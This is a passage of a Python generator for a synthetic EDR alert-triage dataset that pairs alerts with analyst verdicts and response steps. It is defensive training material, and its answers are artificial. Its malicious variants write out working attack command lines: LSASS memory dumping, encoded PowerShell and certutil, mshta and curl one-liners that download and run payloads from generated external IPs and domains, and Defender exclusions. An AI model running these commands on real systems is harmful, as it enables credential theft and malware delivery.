"""
Synthetic EDR alert triage dataset generator (v2).

Design rules (from the v1 audit):
  * Alerts contain TELEMETRY only: full process paths for the whole tree,
    signature status, fleet prevalence, network activity. Organizational
    knowledge (approved tools, tickets, change windows, admin roster) lives in
    retrieved documents, which is what the RAG tier supplies.
  * Each detection rule has ONE title and ONE vendor severity, shared by its
    malicious and benign variants, so title/severity do not reveal the verdict.
  * Masquerade variants: trusted process names running from the wrong path or
    unsigned, so the model must read paths and signatures, not names.
  * Needs Investigation covers several shapes, not only "admin on a workstation".
  * ~15% of examples include retrieved context documents; the answer then ends
    with a "Sources:" line. Some context flips the verdict.
  * Test split holds out whole variants (test_holdout.jsonl) in addition to a
    small in-distribution split (test.jsonl).

Verdict definitions (also in the system prompt):
  True Positive         malicious or unauthorized activity
  Benign True Positive  the security-relevant action the rule watches for really
                        happened, but an authorized person or system did it
  False Positive        the rule matched ordinary OS/application behavior that is
                        not the watched action at all
  Needs Investigation   telemetry alone cannot decide; say what would resolve it

Python 3.8 compatible, standard library only.
"""
import base64
import csv
import hashlib
import json
import os
import random
import re
from datetime import datetime, timedelta

SEED = 1337
SAMPLES_PER_VARIANT = 28
RAG_FRACTION = 0.25
TEST_FRACTION = 0.08
HOLDOUT_VARIANTS = {"lsass_comsvcs", "certutil_decode", "defender_fake_intune", "dev_ps_github"}
OUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")

SYSTEM_PROMPT = (
    "You are a Tier-2 SOC analyst. Triage the EDR alert you are given and choose one verdict. "
    "True Positive: malicious or unauthorized activity. "
    "Benign True Positive: the security-relevant action the rule watches for really happened, "
    "but an authorized person or system performed it. "
    "False Positive: the rule matched ordinary OS or application behavior that is not the watched action. "
    "Needs Investigation: the telemetry alone cannot decide; state what would resolve it. "
    "Judge processes by full path, signature, and prevalence, not by name alone. "
    "Map the activity to MITRE ATT&CK, cite specific evidence from the alert, and give concrete next actions. "
    "If retrieved context documents are provided, use them and list the documents you relied on "
    "in a final 'Sources:' line. Use the exact output format."
)

OPENERS = ["Triage this alert:", "Triage this alert:", "Triage this alert:",
           "New EDR alert for review:", "Is this alert malicious? Triage it:",
           "Please assess the following detection:", "Analyze this endpoint alert and give your verdict:"]

R = random.Random(SEED)

FIRST = ["james", "maria", "wei", "aisha", "daniel", "priya", "lucas", "fatima",
         "ethan", "sofia", "noah", "yuki", "omar", "elena", "kevin", "grace",
         "diego", "hannah", "raj", "chloe"]
LAST = ["reyes", "chen", "patel", "okafor", "miller", "nguyen", "rossi", "kim",
        "garcia", "schmidt", "johnson", "haddad", "silva", "brown", "tanaka",
        "kowalski", "murphy", "ali", "fischer", "lopez"]
DEPTS = [("FIN", "Finance Workstations"), ("HR", "HR Workstations"),
         ("SLS", "Sales Workstations"), ("MKT", "Marketing Workstations"),
         ("ENG", "Engineering Workstations"), ("LGL", "Legal Workstations")]
OS_WS = ["Windows 11 23H2", "Windows 11 24H2"]
OS_SRV = ["Windows Server 2022", "Windows Server 2019", "Windows Server 2025"]
BAD_TLDS = [".top", ".xyz", ".icu", ".shop", ".online", ".site"]
BAD_WORDS = ["cdn-update", "secure-docs", "msoffice-sync", "invoice-portal",
             "cloud-share", "doc-viewer", "support-desk", "files-dl"]

# Detection rules: one title and one vendor severity per rule.
RULES = {
    "lsass": ("Suspicious access to LSASS process memory", "High"),
    "encps": ("Suspicious encoded PowerShell command", "Medium"),
    "certutil": ("Suspicious certutil execution", "Medium"),
    "officechild": ("Office application spawned child process", "Medium"),
    "schtask": ("Scheduled task created with suspicious properties", "Medium"),
    "runkey": ("Registry Run key persistence", "Medium"),
    "vss": ("Volume shadow copy manipulation", "High"),
    "remsvc": ("Remote service creation (PsExec-style)", "High"),
    "cloudsync": ("Large upload by cloud sync tool", "High"),
    "rundll32": ("Suspicious rundll32 execution", "Low"),
    "recon": ("Domain reconnaissance commands", "Medium"),
    "defender": ("Microsoft Defender configuration changed", "High"),
    "webchild": ("Web server process spawned child process", "High"),
    "massfile": ("Mass file modification consistent with ransomware", "Critical"),
    "rat": ("Remote access tool executed", "Medium"),
    "svcshell": ("Service process spawned command shell", "Medium"),
}
SEV_ORDER = ["Low", "Medium", "High", "Critical"]

# Canonical locations of common binaries; trees are rendered with full paths.
PATHS = {
    "explorer.exe": "C:\\Windows\\explorer.exe",
    "cmd.exe": "C:\\Windows\\System32\\cmd.exe",
    "powershell.exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "services.exe": "C:\\Windows\\System32\\services.exe",
    "svchost.exe": "C:\\Windows\\System32\\svchost.exe",
    "wscript.exe": "C:\\Windows\\System32\\wscript.exe",
    "mshta.exe": "C:\\Windows\\System32\\mshta.exe",
    "rundll32.exe": "C:\\Windows\\System32\\rundll32.exe",
    "msiexec.exe": "C:\\Windows\\System32\\msiexec.exe",
    "control.exe": "C:\\Windows\\System32\\control.exe",
    "WINWORD.EXE": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "EXCEL.EXE": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "POWERPNT.EXE": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
    "OUTLOOK.EXE": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "msedge.exe": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "CcmExec.exe": "C:\\Windows\\CCM\\CcmExec.exe",
    "w3wp.exe": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
    "PSEXESVC.exe": "C:\\Windows\\PSEXESVC.exe",
    "IntuneAgent.exe": "C:\\Program Files (x86)\\Microsoft Intune Management Extension\\Microsoft.Management.Services.IntuneWindowsAgent.exe",
    "sqlservr.exe": "C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe",
}
ALL_HOSTS = "Image present on all managed hosts"


# --------------------------------------------------------------------- helpers
def pick(seq):
    return R.choice(seq)


def user():
    return pick(FIRST)[0] + pick(LAST)


def admin_user():
    return "adm-" + user()


def rand_sha():
    return "".join(R.choice("0123456789abcdef") for _ in range(64))


def sha_for(path):
    """Stable hash for well-known system/vendor binaries, random for anything else."""
    low = path.lower()
    if low.startswith(("c:\\windows\\", "c:\\program files")) and "\\temp\\" not in low:
        return hashlib.sha256(low.encode()).hexdigest()
    return rand_sha()


def ext_ip():
    first = pick([45, 91, 103, 141, 176, 185, 193, 194, 212, 217])
    return "{}.{}.{}.{}".format(first, R.randint(1, 254), R.randint(1, 254), R.randint(1, 254))


def bad_domain():
    return pick(BAD_WORDS) + str(R.randint(1, 99)) + pick(BAD_TLDS)


def rand_name(n=6):
    return "".join(R.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(n))


def prev(n):
    return "Image seen on {} host{} in last 30 days".format(n, "" if n == 1 else "s")


def ts(profile="business"):
    day = datetime(2026, 1, 5) + timedelta(days=R.randint(0, 240))
    if profile == "offhours":
        hour = pick([0, 1, 2, 3, 4, 5, 21, 22, 23])
    elif profile == "night_window":
        hour = pick([1, 2, 3])
    elif profile == "any":
        hour = R.randint(0, 23)
    else:
        hour = R.randint(8, 17)
    t = day.replace(hour=hour, minute=R.randint(0, 59), second=R.randint(0, 59))
    return t.strftime("%Y-%m-%dT%H:%M:%SZ"), hour


def is_offhours(h):
    return h < 7 or h > 19


def offhours_note(hour):
    return "Activity occurred at {:02d}:00 UTC, outside normal business hours.".format(hour)


def ws_host():
    code, group = pick(DEPTS)
    return "WS-{}-{:03d}".format(code, R.randint(1, 250)), group, pick(OS_WS)


def srv_host(kind):
    names = {
        "file": ("SRV-FILE{:02d}", "File Servers"),
        "web": ("SRV-WEB{:02d}", "Internet-Facing Web Servers"),
        "app": ("SRV-APP{:02d}", "Application Servers"),
        "bkp": ("SRV-BKP{:02d}", "Backup Servers"),
        "jmp": ("JMP-ADM{:02d}", "Admin Jump Servers"),
        "sql": ("SRV-SQL{:02d}", "Database Servers"),
    }
    if kind == "help":
        return "WS-IT-{:03d}".format(R.randint(1, 60)), "IT Helpdesk Workstations", pick(OS_WS)
    fmt, group = names[kind]
    return fmt.format(R.randint(1, 12)), group, pick(OS_SRV)


def ps_enc(script):
    return base64.b64encode(script.encode("utf-16-le")).decode()


def chain(*items):
    """Render a process ancestry with full paths. Items may be a known name,
    a known name followed by arguments, or an explicit full path."""
    out = []
    for it in items:
        if it in PATHS:
            out.append(PATHS[it])
        elif re.match(r"^[A-Za-z]:\\", it):
            out.append(it)
        else:
            name, _, rest = it.partition(" ")
            out.append((PATHS.get(name, name) + " " + rest).strip())
    return " <- ".join(out)


def alert(rule, time, host, group, os_, usr, process, cmdline, tree, signature, prevalence, network, extra):
    title, sev = RULES[rule]
    if R.random() < 0.15:  # different EDR policies rate the same rule differently
        i = SEV_ORDER.index(sev) + pick([-1, 1])
        sev = SEV_ORDER[max(0, min(3, i))]
    return dict(rule=rule, title=title, vendor_sev=sev, time=time, host=host, group=group, os=os_,
                user=usr, process=process, cmdline=cmdline, tree=tree, signature=signature,
                prevalence=prevalence, network=network, extra=extra, sha=sha_for(process))


def tri(verdict, conf, sev, mitre, summary, evidence, actions):
    return dict(verdict=verdict, conf=conf, sev=sev, mitre=mitre,
                summary=summary, evidence=evidence, actions=actions, sources=[])


def fp_mitre(tech):
    return tech + " (detection category only)"


def btp_mitre(tech):
    return tech + " (authorized activity)"


# ===================================================================== LSASS
def lsass_procdump():
    u = user(); host, grp, os_ = ws_host(); t, h = ts(pick(["business", "offhours"]))
    exe = pick(["pd64.exe", "pdump.exe", "p.exe", "svc.exe"])
    proc = "C:\\Users\\{}\\AppData\\Local\\Temp\\{}".format(u, exe)
    out = "C:\\Users\\Public\\{}.dmp".format(pick(["l", "out", "debug", "mem"]))
    a = alert("lsass", t, host, grp, os_, "CORP\\" + u, proc,
              "{} -accepteula -ma lsass.exe {}".format(exe, out),
              chain("cmd.exe", "powershell.exe", "explorer.exe"),
              "Signed: Microsoft Corporation (original filename procdump64.exe)", prev(1), "None observed",
              "Target lsass.exe, GrantedAccess 0x1FFFFF; file {} created (48 MB)".format(out))
    ev = ["The binary's original filename is procdump64.exe, but it was renamed to {} and runs from AppData\\Local\\Temp.".format(exe),
          "The -ma lsass.exe flags create a full memory dump of LSASS, which holds credential material.",
          "The dump was written to {}, a world-readable staging location.".format(out),
          "{} is a standard user account on a {} host, with no reason to dump LSASS.".format(u, grp)]
    if is_offhours(h):
        ev.append(offhours_note(h))
    return a, tri("True Positive", "High", "Critical", "T1003.001 - OS Credential Dumping: LSASS Memory",
                  "A renamed ProcDump binary in a user Temp folder dumped LSASS memory to a world-readable path, which is credential theft.",
                  ev,
                  ["Isolate {} from the network immediately.".format(host),
                   "Reset passwords for {} and every account with an active session on the host, and revoke Kerberos tickets.".format(u),
                   "Collect {} and the renamed binary for forensics, then remove the dump from the host.".format(out),
                   "Hunt for logons by the exposed accounts on other hosts in the last 24 hours."])


def lsass_comsvcs():
    u = user(); host, grp, os_ = ws_host(); t, h = ts(pick(["business", "offhours"]))
    lp = R.randint(600, 980); out = "C:\\Windows\\Temp\\{}.bin".format(rand_name(4))
    parent = "C:\\Users\\{}\\AppData\\Local\\Temp\\{}.exe".format(u, rand_name(7))
    a = alert("lsass", t, host, grp, os_, "CORP\\" + u, PATHS["rundll32.exe"],
              "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {} {} full".format(lp, out),
              chain("powershell.exe", "cmd.exe", parent),
              "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "lsass.exe PID is {}; file {} created".format(lp, out))
    return a, tri("True Positive", "High", "Critical",
                  "T1003.001 - OS Credential Dumping: LSASS Memory (via T1218.011 Rundll32)",
                  "rundll32 invoked the comsvcs.dll MiniDump export against the LSASS PID, a well-known living-off-the-land credential dumping technique.",
                  ["The MiniDump export of comsvcs.dll targets PID {}, which is lsass.exe.".format(lp),
                   "rundll32 and comsvcs.dll are legitimate signed Windows files, so the command line, not the binary, is the malicious part.",
                   "The chain starts from {}, an unknown executable in a Temp folder.".format(parent),
                   "The dump file {} was written to a temp path for later retrieval.".format(out)],
                  ["Isolate {} immediately.".format(host),
                   "Reset credentials for {} and all accounts logged on to the host, prioritizing privileged accounts.".format(u),
                   "Acquire the dump file and the unknown parent executable for analysis.",
                   "Search the fleet for other comsvcs.dll MiniDump command lines in the last 7 days."])


def lsass_werfault():
    host, grp, os_ = srv_host(pick(["app", "file", "sql"])); t, h = ts("any")
    lp = R.randint(600, 980)
    a = alert("lsass", t, host, grp, os_, "NT AUTHORITY\\SYSTEM", "C:\\Windows\\System32\\WerFault.exe",
              "C:\\Windows\\system32\\WerFault.exe -u -p {} -s {}".format(lp, R.randint(100, 900)),
              chain("svchost.exe -k WerSvcGroup", "services.exe"),
              "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Application Error event 1000 for lsass.exe logged 2 seconds earlier; output in C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue")
    return a, tri("False Positive", "High", "Informational",
                  fp_mitre("T1003.001 - OS Credential Dumping: LSASS Memory"),
                  "Windows Error Reporting opened LSASS after a crash; this is normal crash handling, not credential dumping.",
                  ["WerFault.exe runs from C:\\Windows\\System32, is Microsoft-signed, and runs as SYSTEM.",
                   "Its parent is the WerSvc service host, the expected launcher for crash reporting.",
                   "An Application Error event for lsass.exe immediately preceded the access.",
                   "Output went to the standard WER ReportQueue, not a staging path."],
                  ["Close as False Positive.",
                   "Open a ticket with the server team, since an LSASS crash on {} may indicate instability or a faulty driver.".format(host),
                   "Tune the rule to exclude System32 WerFault.exe launched by WerSvc when a crash event precedes it."])


def lsass_fake_werfault():  # masquerade
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    lp = R.randint(600, 980)
    fake = pick(["C:\\ProgramData\\Microsoft\\WER\\WerFault.exe", "C:\\Users\\{}\\AppData\\Local\\Microsoft\\Windows\\WerFault.exe".format(u),
                 "C:\\Windows\\Temp\\WerFault.exe"])
    a = alert("lsass", t, host, grp, os_, "CORP\\" + u, fake,
              "WerFault.exe -u -p {} -s {}".format(lp, R.randint(100, 900)),
              chain("cmd.exe", "C:\\Users\\{}\\Downloads\\{}.exe".format(u, rand_name(6)), "explorer.exe"),
              "Unsigned", prev(1), "None observed",
              "Target lsass.exe, GrantedAccess 0x1FFFFF; no Application Error event preceded the access; 46 MB file written next to the binary")
    return a, tri("True Positive", "High", "Critical",
                  "T1003.001 - OS Credential Dumping: LSASS Memory; T1036.005 - Masquerading: Match Legitimate Name or Location",
                  "A fake WerFault.exe outside System32 dumped LSASS memory while imitating Windows Error Reporting; this is credential theft disguised as crash handling.",
                  ["The real WerFault.exe lives only in C:\\Windows\\System32, but this one runs from {}.".format(fake),
                   "The binary is unsigned and seen on only this host, unlike the real Microsoft-signed file present everywhere.",
                   "No lsass.exe crash event preceded the access, so there was nothing to report.",
                   "A user downloaded the launcher and started it through cmd.exe, not the WerSvc service.",
                   "Full-access to LSASS followed by a 46 MB file write matches a memory dump."],
                  ["Isolate {} immediately.".format(host),
                   "Reset credentials for {} and all accounts with sessions on the host.".format(u),
                   "Collect the fake WerFault.exe, its launcher, and the dump file for analysis.",
                   "Hunt the fleet for WerFault.exe executing outside C:\\Windows\\System32."])


# =========================================================== Encoded PowerShell
def ps_encoded_office():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    ip = ext_ip(); path = pick(["a", "s", "p.ps1", "update"])
    script = "IEX (New-Object Net.WebClient).DownloadString('http://{}/{}')".format(ip, path)
    parent = pick(["WINWORD.EXE", "EXCEL.EXE"])
    doc = pick(["Invoice_{}.docm", "Remittance_{}.xlsm", "PO_{}.docm"]).format(R.randint(1000, 9999))
    a = alert("encps", t, host, grp, os_, "CORP\\" + u, PATHS["powershell.exe"],
              "powershell.exe -nop -w hidden -enc {}".format(ps_enc(script)),
              chain(parent, "OUTLOOK.EXE", "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS,
              "Outbound TCP {}:80 two seconds after launch".format(ip),
              "{} opened {} from the Outlook attachment cache (Content.Outlook) 30 seconds earlier".format(parent, doc))
    return a, tri("True Positive", "High", "High",
                  "T1059.001 - Command and Scripting Interpreter: PowerShell; T1566.001 - Phishing: Spearphishing Attachment",
                  "A macro-enabled document opened from Outlook launched hidden, encoded PowerShell that downloads and executes a remote script.",
                  ["The base64 decodes to: {}".format(script),
                   "{} spawning PowerShell with -nop -w hidden is a classic malicious macro pattern.".format(parent),
                   "The document {} came from the Outlook attachment cache.".format(doc),
                   "The host connected to raw IP {} immediately after launch.".format(ip)],
                  ["Isolate {} and kill the PowerShell process tree.".format(host),
                   "Block {} at the firewall and proxy, and retrieve the second-stage payload if still hosted.".format(ip),
                   "Find and purge the email carrying {} from all mailboxes.".format(doc),
                   "Reset {}'s credentials and check for persistence created after the execution time.".format(u)])


SCCM_SCRIPTS = [
    "Get-WmiObject -Class Win32_Product | Select-Object Name,Version | Export-Csv C:\\Windows\\CCM\\Inventory\\apps.csv -NoTypeInformation",
    "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName,DisplayVersion",
    "if ((Get-Service -Name 'CcmExec').Status -ne 'Running') { exit 1 } else { exit 0 }",
    "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5"]


def ps_encoded_sccm():
    host, grp, os_ = ws_host(); t, h = ts(pick(["business", "night_window"]))
    script = pick(SCCM_SCRIPTS)
    a = alert("encps", t, host, grp, os_, "NT AUTHORITY\\SYSTEM", PATHS["powershell.exe"],
              "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {}".format(ps_enc(script)),
              chain("CcmExec.exe", "services.exe"), "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Parent CcmExec.exe signature: Microsoft Corporation; parent prevalence: all managed hosts")
    return a, tri("Benign True Positive", "High", "Low",
                  btp_mitre("T1059.001 - Command and Scripting Interpreter: PowerShell"),
                  "The SCCM client ran an encoded PowerShell script for inventory or compliance; encoding is how SCCM passes scripts, and the content is benign.",
                  ["The parent is C:\\Windows\\CCM\\CcmExec.exe, the Microsoft-signed SCCM client in its legitimate location, running as SYSTEM.",
                   "The base64 decodes to: {}".format(script),
                   "The decoded script only reads system state and downloads or executes nothing.",
                   "The PowerShell process made no network connections."],
                  ["Close as Benign True Positive.",
                   "Confirm the script matches an approved SCCM configuration item.",
                   "Tune the rule to suppress encoded PowerShell from C:\\Windows\\CCM\\CcmExec.exe when the decoded content matches approved scripts."])


def ps_encoded_fake_sccm():  # masquerade
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    ip = ext_ip()
    script = pick(["IEX (New-Object Net.WebClient).DownloadString('http://{}/inv')".format(ip),
                   "iwr http://{}/c.ps1 -UseBasicParsing | iex".format(ip),
                   "Add-MpPreference -ExclusionPath $env:APPDATA; iwr http://{}/u -OutFile $env:APPDATA\\u.exe; & $env:APPDATA\\u.exe".format(ip)])
    fake = pick(["C:\\Users\\{}\\AppData\\Local\\Microsoft\\CCM\\CcmExec.exe".format(u),
                 "C:\\ProgramData\\CCM\\CcmExec.exe", "C:\\Users\\Public\\CCM\\CcmExec.exe"])
    a = alert("encps", t, host, grp, os_, "CORP\\" + u, PATHS["powershell.exe"],
              "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {}".format(ps_enc(script)),
              chain(fake, "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS,
              "Outbound TCP {}:80 from powershell.exe".format(ip),
              "Parent {} signature: Unsigned; parent prevalence: 1 host".format(fake))
    return a, tri("True Positive", "High", "High",
                  "T1059.001 - PowerShell; T1036.005 - Masquerading: Match Legitimate Name or Location",
                  "Malware named CcmExec.exe but running from a user-writable folder launched encoded PowerShell that downloads a payload; it imitates the SCCM client to blend in.",
                  ["The real SCCM client is C:\\Windows\\CCM\\CcmExec.exe, but this parent runs from {}.".format(fake),
                   "The parent is unsigned and seen on one host, while the real client is Microsoft-signed and present everywhere.",
                   "It runs under user {} and was started by explorer.exe, whereas the real client runs as SYSTEM under services.exe.".format(u),
                   "The base64 decodes to: {}".format(script),
                   "PowerShell connected to raw IP {}.".format(ip)],
                  ["Isolate {}.".format(host),
                   "Collect the fake CcmExec.exe and block {}.".format(ip),
                   "Hunt the fleet for CcmExec.exe running outside C:\\Windows\\CCM.",
                   "Reset {}'s credentials and remove any persistence that launches the fake binary.".format(u)])


def ps_encoded_ambiguous():
    adm = admin_user(); host, grp, os_ = ws_host(); t, h = ts("business")
    script = pick([
        "Get-ADComputer -Filter * -Properties OperatingSystem | Export-Csv $env:TEMP\\c.csv",
        "Get-ADGroupMember 'Domain Admins' -Recursive | Select SamAccountName",
        "Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv $env:TEMP\\u.csv"])
    a = alert("encps", t, host, grp, os_, "CORP\\" + adm, PATHS["powershell.exe"],
              "powershell.exe -enc {}".format(ps_enc(script)),
              chain("cmd.exe", "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS, "LDAP queries to domain controllers only",
              "ActiveDirectory PowerShell module loaded")
    return a, tri("Needs Investigation", "Medium", "Medium",
                  "T1087.002 - Account Discovery: Domain Account; T1059.001 - PowerShell",
                  "An admin account ran encoded Active Directory enumeration from a standard user workstation; it may be legitimate admin work, but the encoding and location are unusual.",
                  ["The base64 decodes to: {}".format(script),
                   "{} is a privileged account, so the activity could be routine administration.".format(adm),
                   "It ran on {}, a {} host, rather than an admin jump server.".format(host, grp),
                   "Encoding a plain AD query has no operational purpose and is a common evasion habit."],
                  ["Check the admin roster or ask the owner of {} to confirm the activity and its purpose.".format(adm),
                   "Review {} sign-ins over the last 24 hours for unusual source hosts or MFA anomalies.".format(adm),
                   "If unconfirmed within 1 hour, escalate to True Positive, disable the account, and isolate {}.".format(host)])


def dev_ps_github():
    u = user(); host = "WS-ENG-{:03d}".format(R.randint(1, 250)); t, h = ts("business")
    org = pick(["corp-eng", "corp-eng", pick(FIRST) + "-dev" + str(R.randint(1, 99)), "tools-" + rand_name(5)])
    repo = pick(["dev-setup", "bootstrap", "env-init", "toolchain"])
    script = "iwr https://raw.githubusercontent.com/{}/{}/main/setup.ps1 -UseBasicParsing | iex".format(org, repo)
    code = "C:\\Users\\{}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe".format(u)
    a = alert("encps", t, host, "Engineering Workstations", pick(OS_WS), "CORP\\" + u, PATHS["powershell.exe"],
              "powershell.exe -NoProfile -enc {}".format(ps_enc(script)),
              chain(code, "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS,
              "HTTPS to raw.githubusercontent.com; no other external connections",
              "Parent Code.exe signature: Microsoft Corporation; script wrote files under C:\\Users\\{}\\dev\\".format(u))
    a["_org"] = org
    return a, tri("Needs Investigation", "Medium", "Medium",
                  "T1059.001 - PowerShell; T1105 - Ingress Tool Transfer",
                  "A developer's VS Code terminal downloaded and executed a remote setup script from GitHub; common developer behavior, but the script source must be verified.",
                  ["The base64 decodes to: {}".format(script),
                   "The parent is VS Code, signed by Microsoft, on an Engineering workstation, which fits developer tooling.",
                   "Piping a remote script into iex executes unreviewed code, the same technique malware loaders use.",
                   "The source is the GitHub account '{}', and the alert alone cannot show whether it is trusted.".format(org)],
                  ["Check whether github.com/{} is an approved source for developer bootstrap scripts.".format(org),
                   "Review setup.ps1 in the {} repository for downloads, persistence, or credential access.".format(repo),
                   "Ask {} what they were setting up; if the source is unknown, isolate {} pending review.".format(u, host)])


# ==================================================================== certutil
def certutil_download():
    u = user(); host, grp, os_ = ws_host(); t, h = ts(pick(["business", "offhours"]))
    ip = ext_ip(); name = rand_name(5)
    a = alert("certutil", t, host, grp, os_, "CORP\\" + u, "C:\\Windows\\System32\\certutil.exe",
              "certutil.exe -urlcache -split -f http://{}:{}/{}.txt C:\\Users\\Public\\{}.exe".format(ip, pick([80, 8080, 8443]), name, name),
              chain("cmd.exe", pick(["wscript.exe", "mshta.exe"]), "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS,
              "HTTP GET to {} (raw IP)".format(ip),
              "C:\\Users\\Public\\{}.exe written (PE file, unsigned, seen on 1 host) and executed 6 seconds later".format(name))
    ev = ["The -urlcache -split -f flags are the known certutil download technique; administrators do not fetch files this way.",
          "The source is a raw external IP, {}, not a vendor or internal domain.".format(ip),
          "A .txt download was saved as C:\\Users\\Public\\{}.exe, an unsigned single-host executable, and run.".format(name),
          "The chain comes from a script host, consistent with a malicious script or HTA."]
    if is_offhours(h):
        ev.append(offhours_note(h))
    return a, tri("True Positive", "High", "High",
                  "T1105 - Ingress Tool Transfer; T1218 - System Binary Proxy Execution",
                  "certutil.exe was abused to download an executable disguised as a .txt from a raw IP, which then ran; this is a malware delivery chain.",
                  ev,
                  ["Isolate {} and terminate {}.exe.".format(host, name),
                   "Submit {}.exe for sandbox analysis and extract C2 indicators.".format(name),
                   "Block {} and sweep the fleet for connections to it and for the file hash.".format(ip),
                   "Identify the script that launched the chain and scope other recipients."])


def certutil_decode():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    n = rand_name(6)
    a = alert("certutil", t, host, grp, os_, "CORP\\" + u, "C:\\Windows\\System32\\certutil.exe",
              "certutil -decode C:\\Users\\{0}\\AppData\\Local\\Temp\\{1}.b64 C:\\Users\\{0}\\AppData\\Local\\Temp\\{1}.dll".format(u, n),
              chain("cmd.exe", "wscript.exe", "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "{}.b64 was extracted from a ZIP downloaded by msedge.exe 40 seconds earlier; the decoded DLL was then loaded by rundll32.exe".format(n))
    return a, tri("True Positive", "High", "High",
                  "T1140 - Deobfuscate/Decode Files or Information; T1105 - Ingress Tool Transfer",
                  "certutil decoded a base64 blob from a downloaded ZIP into a DLL that was immediately loaded, a common loader technique.",
                  ["The command decodes {0}.b64 into {0}.dll in the user's Temp folder.".format(n),
                   "The encoded file arrived in a browser-downloaded ZIP 40 seconds earlier.",
                   "wscript.exe launched the chain, so a script inside the ZIP was double-clicked.",
                   "rundll32 loaded the decoded DLL right after, so the payload executed."],
                  ["Isolate {}.".format(host),
                   "Collect the ZIP, the .b64 file, and the DLL for analysis and record their hashes.",
                   "Review browser history for the download URL and block the domain.",
                   "Check for persistence created by the DLL, such as Run keys and scheduled tasks."])


def certutil_hashfile():
    adm = admin_user(); host, grp, os_ = srv_host("help"); t, h = ts("business")
    f = pick(["Zoom_6.2.msi", "AcroRdr_2025.msi", "7z2409-x64.msi", "Firefox_Setup_131.exe", "npp.8.7.Installer.x64.exe"])
    a = alert("certutil", t, host, grp, os_, "CORP\\" + adm, "C:\\Windows\\System32\\certutil.exe",
              "certutil -hashfile C:\\Users\\{}\\Downloads\\{} SHA256".format(adm, f),
              chain("cmd.exe", "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "No files written by certutil")
    return a, tri("False Positive", "High", "Informational",
                  fp_mitre("T1218 - System Binary Proxy Execution"),
                  "An IT admin used certutil -hashfile to verify an installer checksum, an ordinary use of certutil that is not proxy execution.",
                  ["The -hashfile option only computes a hash and cannot download, decode, or execute content.",
                   "The target is a vendor installer, {}, in the admin's Downloads folder.".format(f),
                   "{} is an IT account on an IT Helpdesk workstation.".format(adm),
                   "No network activity and no file writes were observed."],
                  ["Close as False Positive.",
                   "Tune the rule to alert only on certutil with -urlcache, -decode, -encode, or -verifyctl."])


# ============================================================== Office children
def office_child_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    dom = bad_domain()
    child = pick([
        ("cmd.exe", "cmd.exe /c mshta.exe https://{}/v.hta".format(dom)),
        ("mshta.exe", "mshta.exe https://{}/doc.hta".format(dom)),
        ("cmd.exe", "cmd.exe /c curl -s https://{}/x -o %TEMP%\\x.exe && %TEMP%\\x.exe".format(dom))])
    doc = pick(["Payment_Advice_{}.xlsm", "Contract_Review_{}.docm", "Shipping_{}.xlsm"]).format(R.randint(100, 999))
    parent = "EXCEL.EXE" if doc.endswith("xlsm") else "WINWORD.EXE"
    a = alert("officechild", t, host, grp, os_, "CORP\\" + u, PATHS[child[0]], child[1],
              chain(parent, "OUTLOOK.EXE", "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS,
              "DNS query for {} (domain first seen in environment today)".format(dom),
              "{} opened {} from the Outlook attachment cache 3 minutes after the message arrived from an external sender".format(parent, doc))
    return a, tri("True Positive", "High", "High",
                  "T1204.002 - User Execution: Malicious File; T1566.001 - Spearphishing Attachment",
                  "A macro document from an external email spawned {} to fetch a remote payload from a newly seen domain.".format(child[0]),
                  ["{} spawned {}, which Office does not do during normal use.".format(parent, child[0]),
                   "The command pulls content from {}, a suspicious-TLD domain first seen today.".format(dom),
                   "{} came from an external email 3 minutes earlier.".format(doc),
                   "The chain matches a standard phishing initial-access pattern."],
                  ["Isolate {} and terminate the process tree.".format(host),
                   "Block {} at DNS and proxy, and search proxy logs for other clients that resolved it.".format(dom),
                   "Purge the email from all mailboxes and identify other recipients.",
                   "Reset {}'s credentials and review mailbox rules for attacker changes.".format(u)])


def office_child_splwow():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    parent = pick(["WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE"])
    a = alert("officechild", t, host, grp, os_, "CORP\\" + u, "C:\\Windows\\splwow64.exe",
              "C:\\Windows\\splwow64.exe {}".format(R.randint(8000, 12500)),
              chain(parent, "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS,
